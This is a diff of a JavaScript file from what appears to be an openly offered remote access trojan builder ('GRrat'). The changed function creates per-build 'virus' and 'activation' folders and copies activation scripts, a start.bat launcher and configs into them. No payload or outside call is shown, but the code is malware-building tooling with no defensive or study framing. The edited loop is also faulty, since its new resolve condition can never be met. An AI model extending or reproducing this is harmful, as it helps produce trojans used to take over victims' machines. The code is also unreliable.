@@ -282,9 +282,9 @@ menu.ratcreating = function () { // full ready
                                     fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\virus`, err => {
                                         fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\activation`, err => {
                                             // СОЗДАНО, ПЕРЕЙДИТЕ К АКТИВАЦИИ
-                                            let resourcescopy = [['./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`], ['./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`], ['./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`], [`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`], [`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`], ["./LICENSE.md", `${__dirname}\\ratexes\\${ratfilename}\\LICENSE.md`]]
+                                            let resourcescopy = [['./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`], ['./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`], ['./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`], [`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`], ["./LICENSE.md", `${__dirname}\\ratexes\\${ratfilename}\\LICENSE.md`]]
 
-                                            resourcescopy.forEach(arr => {
+                                            resourcescopy.forEach((arr, index) => {
                                                 fs.copy(arr[0], arr[1], err => {
                                                     if (err) {
                                                         if (debugmode == "-debug") {
@@ -292,8 +292,11 @@ menu.ratcreating = function () { // full ready
                                                         }
                                                     }
                                                 })
+                                                if (resourcescopy.length <= index) {
+
+                                                    resolve()
+                                                }
                                             })
-                                            resolve()
                                         })
                                     })
                                 })
@@ -470,6 +473,7 @@ menu.init = function () {// full ready
         }
     })
 }
+
 fs.exists(configsobj.configsfolderpath, isHereConfigsFolder => {
     debugmsg("GRrat start!", true)
     new Promise((resolve) => {
